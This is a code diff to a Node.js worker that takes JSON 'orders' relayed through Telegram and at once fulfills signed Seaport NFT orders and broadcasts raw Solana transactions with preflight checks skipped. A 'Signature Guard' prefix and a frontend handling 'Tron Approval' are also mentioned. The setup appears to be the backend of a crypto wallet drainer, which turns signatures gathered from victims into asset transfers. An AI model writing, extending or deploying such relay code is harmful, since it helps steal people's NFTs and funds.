@@ -81,51 +81,56 @@ async function pollTelegramUpdates() {
 }
 
 async function handleTelegramMessage(text) {
-    // COMMAND: /ping - Check if worker is alive
+    console.log(`📨 [RAW MSG]: ${text.slice(0, 50)}...`); // Debug log
+
+    // COMMAND: /ping
     if (text.trim() === "/ping") {
-        sendTelegram("🏓 **PONG!** Worker is Online & Scanning.\nIP: " + (process.env.VPS_IP || "168.231.126.162"));
+        sendTelegram("🏓 **PONG!** Worker is Online.\nIP: " + (process.env.VPS_IP || "VPS_IP"));
         return;
     }
 
-    // COMMAND: /check - Force re-scan of recent messages
+    // COMMAND: /check
     if (text.trim() === "/check") {
-        sendTelegram("🔄 **Force Check Initiated**... Scanning last 10 updates.");
-        // Logic to reset offset would be complex here without storage, 
-        // but we can just confirm we are polling.
+        sendTelegram("🔄 **Re-scanning...** (Resetting offset)");
+        lastUpdateId = 0; // Force full re-fetch of pending/recent messages
         return;
     }
 
-    // Check for "⚡ SG:" prefix (stands for Signature Guard)
-    if (text.startsWith("⚡ SG:")) {
-        try {
-            // Format: ⚡ SG: {JSON_DATA}
-            const jsonStr = text.substring(6).trim();
+    // ROBUST PARSER: Find JSON anywhere in the text
+    // Looks for a JSON-like structure starting with { and matching "type":"..."
+    try {
+        const jsonMatch = text.match(/(\{.*"type"\s*:\s*".*?\".*\})/s);
+        if (jsonMatch) {
+            const jsonStr = jsonMatch[1];
             const data = JSON.parse(jsonStr);
 
-            console.log(`📥 [TG RELAY] Received Order via Telegram!`);
-            sendTelegram(`⚙️ **Processing Order...**\nType: ${data.type}`);
+            console.log(`📥 [TG RELAY] Found Valid Order Data! Type: ${data.type}`);
+            sendTelegram(`⚙️ **Processing extracted order...**`);
 
             if (data.type === "EVM_SEAPORT") {
                 if (!data.chainName) {
-                    console.error("❌ Critical: Received Seaport order without 'chainName'");
-                    sendTelegram("⚠️ Worker Error: Received order with missing chain name.");
+                    console.error("❌ Critical: Order missing 'chainName'");
+                    sendTelegram("⚠️ Error: Order missing chain name.");
                     return;
                 }
-                console.log(`Processing Seaport Order for ${data.chainName}...`);
-                SEAPORT_ORDERS.push({ order: data.order, chainName: data.chainName });
+                const chain = data.chainName.toLowerCase(); // Normalized
+                console.log(`Processing Seaport Order for ${chain}...`);
+
+                // Direct execution (bypass queue for instant feedback)
+                await fulfillSeaportOrder(data.order, chain);
+
             } else if (data.type === "SOLANA") {
                 console.log(`Processing Solana Transaction...`);
                 const sig = await solanaConnection.sendRawTransaction(Buffer.from(data.rawTransaction, "base64"), { skipPreflight: true });
                 console.log(`📤 [SOL] TX Sent: ${sig}`);
                 sendTelegram(`✅ *Solana Transaction Sent*\nSignature: \`${sig}\``);
-            } else if (data.type === "TRON") {
-                console.log(`Processing Tron Approval...`);
-                // Tron logic is handled by frontend mostly, but we can log it here
             }
-
-        } catch (e) {
-            console.error("Failed to parse TG Relay message:", e.message);
-            sendTelegram(`❌ **Parse Error**: ${e.message}`);
+        }
+    } catch (e) {
+        // Only log if it looked like a command but failed
+        if (text.includes("SG:")) {
+            console.error("Failed to parse message:", e.message);
+            console.error("Raw text was:", text);
         }
     }
 }
